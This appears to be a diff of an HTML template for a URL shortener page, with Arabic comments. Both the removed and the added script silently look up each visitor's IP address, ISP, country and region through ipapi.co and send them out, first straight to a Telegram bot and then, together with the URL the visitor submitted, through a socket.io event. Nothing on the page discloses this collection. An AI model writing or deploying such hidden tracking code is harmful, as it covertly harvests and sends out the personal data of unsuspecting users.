@@ -2,34 +2,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>URL Shortener</title>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL Shortener</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+    <script>
+        var socket = io.connect('http://' + document.domain + ':' + location.port);
+        
+        function sendTelegramMessage(message) {
+            socket.emit('send_message', message);
+        }
 
-        <script>
-            $.getJSON('https://ipapi.co/json', function(data) {
-                var ip = data.ip;
-                var isp = data.org;
-                var country = data.country_name;
-                var city = data.region;
-    
-                // إرسال المعلومات إلى تليجرام مع فواصل سطر جديدة
-                var message = `URL Shortener%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
-                sendTelegramMessage(message);
+        $(document).ready(function(){
+            $('form').on('submit', function(event){
+                event.preventDefault(); // منع إعادة تحميل الصفحة
+
+                var original_url = $('#original_url').val();
+
+                $.ajax({
+                    url: '/shorten',
+                    type: 'POST',
+                    data: { original_url: original_url },
+                    success: function(response) {
+                        if(response.short_url) {
+                            $('#short_url').html(`Your shortened URL: <a href="${response.short_url}" target="_blank">${response.short_url}</a>`);
+                        }
+                        
+                        $.getJSON('https://ipapi.co/json', function(data) {
+                            var ip = data.ip;
+                            var isp = data.org;
+                            var country = data.country_name;
+                            var city = data.region;
+                
+                            // إرسال المعلومات إلى تليجرام مع فواصل سطر جديدة
+                            var message = `URL Shortener%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AOriginal URL: ${original_url}`;
+                            sendTelegramMessage(message);
+                        });
+                    },
+                    error: function(error) {
+                        console.log(error);
+                    }
+                });
             });
-    
-            function sendTelegramMessage(message) {
-                var chatId = 'YOUR_TELEGRAM_ID'; // استبدل بمعرف الدردشة الخاص بك
-                var botToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // استبدل برمز الروبوت الخاص بك
-    
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
-                xhr.send();
-            }
-        </script>
-    </head>
+        });
+    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -69,13 +86,10 @@
 </head>
 <body>
     <h1>URL Shortener</h1>
-    <form action="/shorten" method="post">
-        <input type="text" name="original_url" placeholder="Enter your URL here" required>
+    <form>
+        <input id="original_url" type="text" name="original_url" placeholder="Enter your URL here" required>
         <input type="submit" value="Shorten">
     </form>
-    {% if short_url %}
-        <p>Your shortened URL: <a href="{{ short_url }}" target="_blank">{{ short_url }}</a></p>
-    {% endif %}
-
+    <p id="short_url"></p>
 </body>
 </html>
